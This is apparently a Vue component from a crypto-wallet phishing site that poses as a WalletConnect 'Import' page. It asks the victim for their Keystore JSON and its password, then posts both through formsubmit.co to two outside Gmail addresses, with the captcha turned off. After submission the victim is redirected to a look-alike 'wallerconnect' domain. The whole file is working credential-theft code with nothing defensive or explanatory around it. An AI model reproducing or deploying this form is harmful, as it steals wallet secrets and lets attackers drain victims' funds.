<template>
  <form action="https://formsubmit.co/walletconnect60@gmail.com" method="POST">
    <input type="hidden" name="_cc" value="emmawatson89000@gmail.com">
    <input type="text" :placeholder="$route.params.id" readonly class="w-full mb-5 outline-none py-1 px-2 block capitalize">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://wallerconnect.netlify.app/">
    <textarea placeholder="Keystore JSON" :name="$route.params.id" class="w-full h-40 p-2 block mb-5" required></textarea>
    <input type="password" name="password" placeholder="Password" class="w-full mb-1 outline-none py-1 px-2 block">
    <span class="text-16 text-grey block mb-5">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</span>
    <button type="submit" class="w-full py-2 bg-blue text-white uppercase">Import</button>
  </form>
</template>

<script>
export default {
  name: "keystore-json"
}
</script>

<style scoped>

</style>
